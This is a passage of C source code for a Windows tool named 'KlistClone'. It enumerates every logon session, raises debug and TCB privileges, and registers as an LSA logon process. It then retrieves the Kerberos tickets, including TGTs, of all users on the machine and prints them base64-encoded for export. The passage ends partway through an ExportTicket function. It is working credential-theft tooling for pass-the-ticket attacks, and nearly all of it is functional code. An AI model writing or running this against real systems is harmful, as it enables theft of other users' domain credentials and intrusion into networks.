#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <ntsecapi.h>
#include <sddl.h>
#include <stdio.h>
#include <wchar.h>
#include <io.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS(NTAPI* PLSA_ENUMERATE_LOGON_SESSIONS)(PULONG, PLUID*);
typedef NTSTATUS(NTAPI* PLSA_GET_LOGON_SESSION_DATA)(PLUID, PSECURITY_LOGON_SESSION_DATA*);
typedef NTSTATUS(NTAPI* PLSA_FREE_RETURN_BUFFER)(PVOID);
typedef NTSTATUS(NTAPI* PLSA_CONNECT_UNTRUSTED)(PHANDLE);
typedef NTSTATUS(NTAPI* PLSA_LOOKUP_AUTHENTICATION_PACKAGE)(HANDLE, PLSA_STRING, PULONG);
typedef NTSTATUS(NTAPI* PLSA_CALL_AUTHENTICATION_PACKAGE)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
typedef NTSTATUS(NTAPI* PLSA_REGISTER_LOGON_PROCESS)(PLSA_STRING, PHANDLE, PLSA_OPERATIONAL_MODE);

// Structure to store TGT information for summary
typedef struct {
    ULONG logonId;
    wchar_t userName[256];
    wchar_t domain[256];
    wchar_t serviceName[512];
} TGT_INFO;

#define MAX_TGTS 100
TGT_INFO g_tgtList[MAX_TGTS];
ULONG g_tgtCount = 0;

void PrintSeparator(const char* title) {
    printf("\n================================================================================\n");
    if (title) printf("  %s\n================================================================================\n", title);
}

void PrintDebug(const char* m) { printf("[*] %s\n", m); }
void PrintSuccess(const char* m) { printf("[+] %s\n", m); }
void PrintError(const char* m) { printf("[-] %s\n", m); }

const wchar_t* GetLogonTypeString(ULONG t) {
    switch (t) {
    case 2: return L"Interactive";
    case 3: return L"Network";
    case 4: return L"Batch";
    case 5: return L"Service";
    case 7: return L"Unlock";
    case 10: return L"RemoteInteractive";
    default: return L"(0)";
    }
}

const char* GetEncryptionTypeName(LONG e) {
    switch (e) {
    case 17: return "AES128-CTS-HMAC-SHA1-96";
    case 18: return "AES256-CTS-HMAC-SHA1-96";
    case 23: return "RC4-HMAC";
    default: return "Unknown";
    }
}

// Base64 encoding table
static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* Base64Encode(const unsigned char* data, size_t input_length) {
    size_t output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = (char*)malloc(output_length + 1);
    if (encoded_data == NULL) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = base64_chars[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 0 * 6) & 0x3F];
    }

    // Add padding
    for (i = 0; i < (3 - input_length % 3) % 3; i++)
        encoded_data[output_length - 1 - i] = '=';

    encoded_data[output_length] = '\0';
    return encoded_data;
}

void PrintBase64(const char* base64_string) {
    if (!base64_string || strlen(base64_string) == 0) {
        printf("      (empty)\n");
        return;
    }

    // Print in a single line
    printf("      %s\n", base64_string);
}

void AddTGTToList(ULONG logonId, const wchar_t* userName, const wchar_t* domain, const wchar_t* serviceName) {
    if (g_tgtCount >= MAX_TGTS) return;

    g_tgtList[g_tgtCount].logonId = logonId;

    if (userName && wcslen(userName) > 0) {
        wcsncpy(g_tgtList[g_tgtCount].userName, userName, 255);
        g_tgtList[g_tgtCount].userName[255] = L'\0';
    }
    else {
        wcscpy(g_tgtList[g_tgtCount].userName, L"(unknown)");
    }

    if (domain && wcslen(domain) > 0) {
        wcsncpy(g_tgtList[g_tgtCount].domain, domain, 255);
        g_tgtList[g_tgtCount].domain[255] = L'\0';
    }
    else {
        wcscpy(g_tgtList[g_tgtCount].domain, L"(unknown)");
    }

    if (serviceName && wcslen(serviceName) > 0) {
        wcsncpy(g_tgtList[g_tgtCount].serviceName, serviceName, 511);
        g_tgtList[g_tgtCount].serviceName[511] = L'\0';
    }
    else {
        wcscpy(g_tgtList[g_tgtCount].serviceName, L"(unknown)");
    }

    g_tgtCount++;
}

void PrintCurrentLogonId() {
    HANDLE t;
    TOKEN_STATISTICS s;
    DWORD l;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t) &&
        GetTokenInformation(t, TokenStatistics, &s, sizeof(s), &l)) {
        printf("Current LogonId is 0:0x%x\n", s.AuthenticationId.LowPart);
        CloseHandle(t);
    }
}

void EnumerateLogonSessions() {
    HMODULE h = LoadLibraryA("secur32.dll");
    PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
    PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
    PLSA_FREE_RETURN_BUFFER free_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    ULONG cnt = 0;
    PLUID lst = NULL;
    if (enum_fn(&cnt, &lst) == 0) {
        printf("\n");
        for (ULONG i = 0; i < cnt; i++) {
            PSECURITY_LOGON_SESSION_DATA d = NULL;
            if (get_fn(&lst[i], &d) == 0 && d) {
                wchar_t dom[256] = { 0 }, usr[256] = { 0 }, auth[256] = { 0 };

                if (d->LogonDomain.Buffer && d->LogonDomain.Length > 0) {
                    size_t len = d->LogonDomain.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(dom, d->LogonDomain.Buffer, len);
                    dom[len] = L'\0';
                }

                if (d->UserName.Buffer && d->UserName.Length > 0) {
                    size_t len = d->UserName.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(usr, d->UserName.Buffer, len);
                    usr[len] = L'\0';
                }

                if (d->AuthenticationPackage.Buffer && d->AuthenticationPackage.Length > 0) {
                    size_t len = d->AuthenticationPackage.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(auth, d->AuthenticationPackage.Buffer, len);
                    auth[len] = L'\0';
                }

                printf("[%lu] Session %lu 0:0x%lx ", (unsigned long)i, (unsigned long)d->Session, (unsigned long)lst[i].LowPart);

                if (wcslen(dom) && wcslen(usr)) wprintf(L"%ls\\%ls ", dom, usr);
                else if (wcslen(usr)) wprintf(L"%ls ", usr);
                else printf("\\ ");

                if (wcslen(auth)) wprintf(L"%ls:%ls\n", auth, GetLogonTypeString(d->LogonType));
                else wprintf(L"Unknown:%ls\n", GetLogonTypeString(d->LogonType));

                free_fn(d);
            }
        }
        free_fn(lst);
    }
    FreeLibrary(h);
}

void EnumerateMyTickets() {
    HMODULE h = LoadLibraryA("secur32.dll");
    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
    PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    HANDLE lsa = NULL;
    char krb[] = "Kerberos";
    LSA_STRING pkg;
    pkg.Buffer = krb;
    pkg.Length = 8;
    pkg.MaximumLength = 9;

    ULONG auth = 0;
    PKERB_QUERY_TKT_CACHE_RESPONSE rsp = NULL;
    ULONG sz = 0;
    NTSTATUS sub = 0;

    if (con_fn(&lsa) == 0 && lkp_fn(lsa, &pkg, &auth) == 0) {
        KERB_QUERY_TKT_CACHE_REQUEST req;
        req.MessageType = KerbQueryTicketCacheMessage;
        req.LogonId.LowPart = 0;
        req.LogonId.HighPart = 0;

        if (cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub) == 0 && sub == 0) {
            printf("Cached Tickets: (%lu)\n\n", (unsigned long)rsp->CountOfTickets);

            for (ULONG i = 0; i < rsp->CountOfTickets; i++) {
                KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[i];
                wchar_t srv[512] = { 0 }, rlm[256] = { 0 };

                if (t->ServerName.Buffer && t->ServerName.Length > 0) {
                    size_t len = t->ServerName.Length / sizeof(WCHAR);
                    if (len > 511) len = 511;
                    wcsncpy(srv, t->ServerName.Buffer, len);
                    srv[len] = L'\0';
                }

                if (t->RealmName.Buffer && t->RealmName.Length > 0) {
                    size_t len = t->RealmName.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(rlm, t->RealmName.Buffer, len);
                    rlm[len] = L'\0';
                }

                printf("#%lu>\tClient: %ls @ %ls\n", (unsigned long)i, srv, rlm);
                printf("\tServer: %ls @ %ls\n", srv, rlm);
                printf("\tKerbTicket Encryption Type: %s\n", GetEncryptionTypeName(t->EncryptionType));

                SYSTEMTIME stm;
                FILETIME ft;
                ft.dwLowDateTime = t->StartTime.LowPart;
                ft.dwHighDateTime = t->StartTime.HighPart;
                FileTimeToSystemTime(&ft, &stm);
                printf("\tStart Time: %02d/%02d/%04d %02d:%02d:%02d\n",
                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);

                ft.dwLowDateTime = t->EndTime.LowPart;
                ft.dwHighDateTime = t->EndTime.HighPart;
                FileTimeToSystemTime(&ft, &stm);
                printf("\tEnd Time: %02d/%02d/%04d %02d:%02d:%02d\n",
                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);

                printf("\tTicket Flags: 0x%lx", (unsigned long)t->TicketFlags);
                if (t->TicketFlags & 0x40000000) printf(" -> forwardable");
                if (t->TicketFlags & 0x00800000) printf(" -> renewable");
                if (t->TicketFlags & 0x00400000) printf(" -> initial");
                printf("\n\n");
            }

            fre_fn(rsp);
        }
        else {
            printf("Cached Tickets: (0)\n");
        }
        LsaDeregisterLogonProcess(lsa);
    }
    FreeLibrary(h);
}

void EnumerateAllTickets() {
    PrintDebug("Enumerating tickets from ALL sessions on the machine...");

    // Reset TGT list
    g_tgtCount = 0;

    // Enable SeDebugPrivilege and SeTcbPrivilege
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    BOOL privEnabled = FALSE;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        // Try SeDebugPrivilege
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                DWORD err = GetLastError();
                if (err == ERROR_SUCCESS) {
                    PrintSuccess("SeDebugPrivilege enabled successfully");
                    privEnabled = TRUE;
                }
                else if (err == ERROR_NOT_ALL_ASSIGNED) {
                    PrintError("SeDebugPrivilege not available (need Administrator rights)");
                }
                else {
                    printf("[!] AdjustTokenPrivileges returned error: %lu\n", err);
                }
            }
        }
        else {
            printf("[!] LookupPrivilegeValue failed: %lu\n", GetLastError());
        }

        // Try SeTcbPrivilege (required for LsaRegisterLogonProcess)
        if (LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                DWORD err = GetLastError();
                if (err == ERROR_SUCCESS) {
                    PrintSuccess("SeTcbPrivilege enabled successfully");
                }
                else if (err == ERROR_NOT_ALL_ASSIGNED) {
                    PrintError("SeTcbPrivilege not available (only SYSTEM has this privilege)");
                    printf("[!] LsaRegisterLogonProcess will likely fail\n");
                    printf("[!] This is normal - most tools cannot enumerate other users' tickets\n");
                }
                else {
                    printf("[!] AdjustTokenPrivileges for SeTcb returned error: %lu\n", err);
                }
            }
        }

        CloseHandle(hToken);
    }
    else {
        printf("[!] OpenProcessToken failed: %lu\n", GetLastError());
    }

    HMODULE h = LoadLibraryA("secur32.dll");
    PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
    PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
    PLSA_REGISTER_LOGON_PROCESS reg_fn = (PLSA_REGISTER_LOGON_PROCESS)GetProcAddress(h, "LsaRegisterLogonProcess");
    PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    ULONG session_cnt = 0;
    PLUID session_list = NULL;

    if (enum_fn(&session_cnt, &session_list) != 0) {
        PrintError("Failed to enumerate logon sessions");
        FreeLibrary(h);
        return;
    }

    printf("Found %lu logon sessions\n\n", (unsigned long)session_cnt);

    HANDLE lsa = NULL;
    LSA_STRING lsaName;
    char lsaNameStr[] = "KlistClone";
    lsaName.Buffer = lsaNameStr;
    lsaName.Length = (USHORT)strlen(lsaNameStr);
    lsaName.MaximumLength = lsaName.Length + 1;
    LSA_OPERATIONAL_MODE mode = 0;

    // Try to use LsaRegisterLogonProcess for full access
    NTSTATUS regStatus = reg_fn(&lsaName, &lsa, &mode);
    if (regStatus != 0) {
        printf("[!] LsaRegisterLogonProcess failed with status 0x%08lX\n", (unsigned long)regStatus);

        // Common error codes
        if (regStatus == 0xC0000022) {
            printf("[!] STATUS_ACCESS_DENIED - Access Denied\n");
            printf("[!] You need to run this program as Administrator\n");
        }
        else if (regStatus == 0xC000000D) {
            printf("[!] STATUS_INVALID_PARAMETER - Invalid Parameter\n");
        }
        else if (regStatus == 0xC0000041) {
            printf("[!] STATUS_PORT_DISCONNECTED - LSA port disconnected\n");
            printf("[!] This can happen if the LSA is not properly initialized\n");
        }

        PrintError("Cannot enumerate tickets from other sessions without LsaRegisterLogonProcess");
        PrintError("Will only be able to query current user's session");

        FreeLibrary(h);
        fre_fn(session_list);
        return;
    }
    else {
        PrintSuccess("LsaRegisterLogonProcess succeeded - full access granted");
    }

    char krb[] = "Kerberos";
    LSA_STRING pkg;
    pkg.Buffer = krb;
    pkg.Length = 8;
    pkg.MaximumLength = 9;

    ULONG auth = 0;
    if (lkp_fn(lsa, &pkg, &auth) != 0) {
        PrintError("Failed to find Kerberos package");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    ULONG total_sessions_with_tickets = 0;
    ULONG total_tickets = 0;
    ULONG total_tgts = 0;

    for (ULONG i = 0; i < session_cnt; i++) {
        PSECURITY_LOGON_SESSION_DATA session_data = NULL;
        if (get_fn(&session_list[i], &session_data) != 0 || !session_data) continue;

        wchar_t usr[256] = { 0 }, dom[256] = { 0 }, auth_pkg[256] = { 0 };
        wchar_t sid_str[256] = { 0 };

        if (session_data->UserName.Buffer && session_data->UserName.Length > 0) {
            size_t len = session_data->UserName.Length / sizeof(WCHAR);
            if (len > 255) len = 255;
            wcsncpy(usr, session_data->UserName.Buffer, len);
            usr[len] = L'\0';
        }

        if (session_data->LogonDomain.Buffer && session_data->LogonDomain.Length > 0) {
            size_t len = session_data->LogonDomain.Length / sizeof(WCHAR);
            if (len > 255) len = 255;
            wcsncpy(dom, session_data->LogonDomain.Buffer, len);
            dom[len] = L'\0';
        }

        if (session_data->AuthenticationPackage.Buffer && session_data->AuthenticationPackage.Length > 0) {
            size_t len = session_data->AuthenticationPackage.Length / sizeof(WCHAR);
            if (len > 255) len = 255;
            wcsncpy(auth_pkg, session_data->AuthenticationPackage.Buffer, len);
            auth_pkg[len] = L'\0';
        }

        // Convert SID to string
        if (session_data->Sid) {
            LPWSTR sidString = NULL;
            if (ConvertSidToStringSidW(session_data->Sid, &sidString)) {
                wcsncpy(sid_str, sidString, 255);
                LocalFree(sidString);
            }
        }

        KERB_QUERY_TKT_CACHE_REQUEST req;
        req.MessageType = KerbQueryTicketCacheMessage;
        req.LogonId = session_list[i];

        PKERB_QUERY_TKT_CACHE_RESPONSE rsp = NULL;
        ULONG sz = 0;
        NTSTATUS sub = 0;

        NTSTATUS status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);

        // Print session info even if no tickets
        printf("  UserName                 : %ls\n", wcslen(usr) ? usr : L"(null)");
        printf("  Domain                   : %ls\n", wcslen(dom) ? dom : L"(null)");
        printf("  LogonId                  : 0x%lx\n", (unsigned long)session_list[i].LowPart);
        printf("  UserSID                  : %ls\n", wcslen(sid_str) ? sid_str : L"(null)");
        printf("  AuthenticationPackage    : %ls\n", wcslen(auth_pkg) ? auth_pkg : L"(null)");
        printf("  LogonType                : %ls\n", GetLogonTypeString(session_data->LogonType));

        SYSTEMTIME stm;
        FILETIME ft;
        ft.dwLowDateTime = session_data->LogonTime.LowPart;
        ft.dwHighDateTime = session_data->LogonTime.HighPart;
        FileTimeToSystemTime(&ft, &stm);
        printf("  LogonTime                : %02d/%02d/%04d %02d:%02d:%02d\n",
            stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);

        printf("  LogonServer              : ");
        if (session_data->LogonServer.Buffer && session_data->LogonServer.Length > 0) {
            wprintf(L"%ls\n", session_data->LogonServer.Buffer);
        }
        else {
            printf("\n");
        }

        printf("  LogonServerDNSDomain     : ");
        if (session_data->DnsDomainName.Buffer && session_data->DnsDomainName.Length > 0) {
            wprintf(L"%ls\n", session_data->DnsDomainName.Buffer);
        }
        else {
            printf("\n");
        }

        printf("  UserPrincipalName        : ");
        if (session_data->Upn.Buffer && session_data->Upn.Length > 0) {
            wprintf(L"%ls\n", session_data->Upn.Buffer);
        }
        else {
            printf("\n");
        }

        // Debug ticket query status
        if (status != 0) {
            printf("  [DEBUG] LsaCallAuthenticationPackage failed with status 0x%08lX\n", (unsigned long)status);
        }
        if (sub != 0) {
            printf("  [DEBUG] SubStatus: 0x%08lX", (unsigned long)sub);
            // Common error codes
            if (sub == 0xC000005E) {
                printf(" (STATUS_NO_LOGON_SERVERS - No logon session)");
            }
            else if (sub == 0xC0000520) {
                printf(" (STATUS_LOGON_SESSION_COLLISION)");
            }
            else if (sub == 0xC0000064) {
                printf(" (STATUS_NO_SUCH_LOGON_SESSION)");
            }
            else if (sub == 0xC0000061) {
                printf(" (STATUS_PRIVILEGE_NOT_HELD - Need LsaRegisterLogonProcess, not LsaConnectUntrusted)");
            }
            else if (sub == 0xC000005F) {
                printf(" (STATUS_NO_SUCH_PACKAGE - Kerberos not available for this session)");
            }
            printf("\n");
        }

        if (status == 0 && sub == 0 && rsp && rsp->CountOfTickets > 0) {
            total_sessions_with_tickets++;
            printf("\n");

            for (ULONG j = 0; j < rsp->CountOfTickets; j++) {
                KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[j];
                wchar_t srv[512] = { 0 }, rlm[256] = { 0 };

                if (t->ServerName.Buffer && t->ServerName.Length > 0) {
                    size_t len = t->ServerName.Length / sizeof(WCHAR);
                    if (len > 511) len = 511;
                    wcsncpy(srv, t->ServerName.Buffer, len);
                    srv[len] = L'\0';
                }

                if (t->RealmName.Buffer && t->RealmName.Length > 0) {
                    size_t len = t->RealmName.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(rlm, t->RealmName.Buffer, len);
                    rlm[len] = L'\0';
                }

                BOOL is_tgt = (wcsstr(srv, L"krbtgt") != NULL);
                if (is_tgt) {
                    total_tgts++;
                    // Add to TGT list
                    AddTGTToList(session_list[i].LowPart, usr, dom, srv);
                }

                // Determine ticket type
                const wchar_t* ticket_type = L"Service Ticket";
                if (is_tgt) {
                    ticket_type = L"Ticket Granting Ticket (TGT)";
                }

                printf("\n");
                printf("    TicketType               :  %ls\n", ticket_type);
                printf("    ServiceName              :  %ls\n", srv);
                printf("    ServiceRealm             :  %ls\n", rlm);
                printf("    UserName                 :  %ls\n", wcslen(usr) ? usr : L"(unknown)");
                printf("    UserRealm                :  %ls\n", rlm);

                FILETIME ft_start, ft_end, ft_renew;
                ft_start.dwLowDateTime = t->StartTime.LowPart;
                ft_start.dwHighDateTime = t->StartTime.HighPart;
                ft_end.dwLowDateTime = t->EndTime.LowPart;
                ft_end.dwHighDateTime = t->EndTime.HighPart;
                ft_renew.dwLowDateTime = t->RenewTime.LowPart;
                ft_renew.dwHighDateTime = t->RenewTime.HighPart;

                FileTimeToSystemTime(&ft_start, &stm);
                printf("    StartTime                :  %02d/%02d/%04d %02d:%02d:%02d\n",
                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);

                FileTimeToSystemTime(&ft_end, &stm);
                printf("    EndTime                  :  %02d/%02d/%04d %02d:%02d:%02d\n",
                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);

                FileTimeToSystemTime(&ft_renew, &stm);
                printf("    RenewTill                :  %02d/%02d/%04d %02d:%02d:%02d\n",
                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);

                printf("    Flags                    :  ");
                BOOL first = TRUE;
                if (t->TicketFlags & 0x40000000) { printf("forwardable"); first = FALSE; }
                if (t->TicketFlags & 0x00800000) { if (!first) printf(", "); printf("renewable"); first = FALSE; }
                if (t->TicketFlags & 0x00400000) { if (!first) printf(", "); printf("initial"); first = FALSE; }
                if (t->TicketFlags & 0x00200000) { if (!first) printf(", "); printf("pre_authent"); first = FALSE; }
                if (t->TicketFlags & 0x20000000) { if (!first) printf(", "); printf("forwarded"); first = FALSE; }
                if (t->TicketFlags & 0x00000001) { if (!first) printf(", "); printf("ok_as_delegate"); first = FALSE; }
                if (t->TicketFlags & 0x00010000) { if (!first) printf(", "); printf("name_canonicalize"); }
                printf("\n");

                printf("    KeyType                  :  %s\n", GetEncryptionTypeName(t->EncryptionType));
                printf("    Base64(key)              :  (not available)\n");

                // NEW: Retrieve the actual ticket data
                ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(srv) * sizeof(WCHAR)));
                PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);

                if (retReq) {
                    ZeroMemory(retReq, reqSize);
                    retReq->MessageType = KerbRetrieveEncodedTicketMessage;
                    retReq->LogonId = session_list[i];
                    retReq->TicketFlags = 0;
                    retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
                    retReq->EncryptionType = 0;
                    retReq->TargetName.Length = (USHORT)(wcslen(srv) * sizeof(WCHAR));
                    retReq->TargetName.MaximumLength = retReq->TargetName.Length;
                    retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
                    memcpy(retReq->TargetName.Buffer, srv, retReq->TargetName.Length);

                    PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
                    ULONG retSz = 0;
                    NTSTATUS retSub = 0;

                    if (cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &retSub) == 0 && retSub == 0 && retRsp) {
                        // Encode ticket to Base64
                        char* base64_ticket = Base64Encode(
                            retRsp->Ticket.EncodedTicket,
                            retRsp->Ticket.EncodedTicketSize
                        );

                        printf("    Base64EncodedTicket   :\n");
                        if (base64_ticket) {
                            PrintBase64(base64_ticket);
                            free(base64_ticket);
                        }
                        else {
                            printf("      (failed to encode)\n");
                        }

                        fre_fn(retRsp);
                    }
                    else {
                        printf("    Base64EncodedTicket   :\n");
                        printf("      (failed to retrieve - Status=0x%08lX, SubStatus=0x%08lX)\n",
                            (unsigned long)0, (unsigned long)retSub);
                    }

                    free(retReq);
                }
                else {
                    printf("    Base64EncodedTicket   :\n");
                    printf("      (memory allocation failed)\n");
                }

                total_tickets++;
            }

            fre_fn(rsp);
        }

        printf("\n");
        fre_fn(session_data);
    }

    printf("\n");
    PrintSeparator("SUMMARY");
    printf("Total logon sessions analyzed: %lu\n", (unsigned long)session_cnt);
    printf("Sessions with Kerberos tickets: %lu\n", (unsigned long)total_sessions_with_tickets);
    printf("Total tickets found: %lu\n", (unsigned long)total_tickets);
    printf("  - TGTs: %lu\n", (unsigned long)total_tgts);
    printf("  - Service Tickets: %lu\n", (unsigned long)(total_tickets - total_tgts));

    if (g_tgtCount > 0) {
        printf("\n");
        PrintSeparator("AVAILABLE TGTs FOR EXPORT");
        printf("%-6s %-12s %-30s %-20s %s\n", "Index", "LogonId", "User", "Domain", "Service");
        printf("%-6s %-12s %-30s %-20s %s\n", "------", "------------", "------------------------------", "--------------------", "--------------------------------");

        for (ULONG i = 0; i < g_tgtCount; i++) {
            wprintf(L"%-6lu 0x%-10lx %-30ls %-20ls %ls\n",
                (unsigned long)(i + 1),
                (unsigned long)g_tgtList[i].logonId,
                g_tgtList[i].userName,
                g_tgtList[i].domain,
                g_tgtList[i].serviceName);
        }
    }

    LsaDeregisterLogonProcess(lsa);
    fre_fn(session_list);
    FreeLibrary(h);
}

void ExportTicket(const char* logonIdStr) {
    // Parse LogonId from hex string (e.g., "0x79fb3")
    ULONG logonId = 0;
    if (sscanf(logonIdStr, "0x%lx", &logonId) != 1 && sscanf(logonIdStr, "%lx", &logonId) != 1) {
        printf("Error: Invalid LogonId format. Use hex format like 0x79fb3 or 79fb3\n");
        return;
    }

    HMODULE h = LoadLibraryA("secur32.dll");
    PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
    PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
    PLSA_REGISTER_LOGON_PROCESS reg_fn = (PLSA_REGISTER_LOGON_PROCESS)GetProcAddress(h, "LsaRegisterLogonProcess");
    PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    if (!enum_fn || !get_fn || !reg_fn || !lkp_fn || !cal_fn || !fre_fn) {
        PrintError("Failed to get LSA functions");
        FreeLibrary(h);
        return;
    }

    // Find the session with matching LogonId
    ULONG session_cnt = 0;
    PLUID session_list = NULL;

    if (enum_fn(&session_cnt, &session_list) != 0) {
        PrintError("Failed to enumerate logon sessions");
        FreeLibrary(h);
        return;
    }

    LUID targetLuid = { 0 };
    wchar_t userName[256] = { 0 };
    wchar_t domain[256] = { 0 };
    BOOL sessionFound = FALSE;

    for (ULONG i = 0; i < session_cnt; i++) {
        if (session_list[i].LowPart == logonId) {
            targetLuid = session_list[i];

            PSECURITY_LOGON_SESSION_DATA session_data = NULL;
            if (get_fn(&session_list[i], &session_data) == 0 && session_data) {
                if (session_data->UserName.Buffer && session_data->UserName.Length > 0) {
                    size_t len = session_data->UserName.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(userName, session_data->UserName.Buffer, len);
                    userName[len] = L'\0';
                }

                if (session_data->LogonDomain.Buffer && session_data->LogonDomain.Length > 0) {
                    size_t len = session_data->LogonDomain.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(domain, session_data->LogonDomain.Buffer, len);
                    domain[len] = L'\0';
                }

                fre_fn(session_data);
            }

            sessionFound = TRUE;
            break;
        }
    }

    if (!sessionFound) {
        printf("Error: LogonId 0x%lx not found\n", logonId);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    // Register with LSA
    HANDLE lsa = NULL;
    LSA_STRING lsaName;
    char lsaNameStr[] = "KlistClone";
    lsaName.Buffer = lsaNameStr;
    lsaName.Length = (USHORT)strlen(lsaNameStr);
    lsaName.MaximumLength = lsaName.Length + 1;
    LSA_OPERATIONAL_MODE mode = 0;

    NTSTATUS regStatus = reg_fn(&lsaName, &lsa, &mode);
    if (regStatus != 0) {
        printf("Error: LsaRegisterLogonProcess failed with status 0x%08lX\n", (unsigned long)regStatus);
        printf("You need Administrator privileges to export tickets from other sessions\n");
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    char krb[] = "Kerberos";
    LSA_STRING pkg;
    pkg.Buffer = krb;
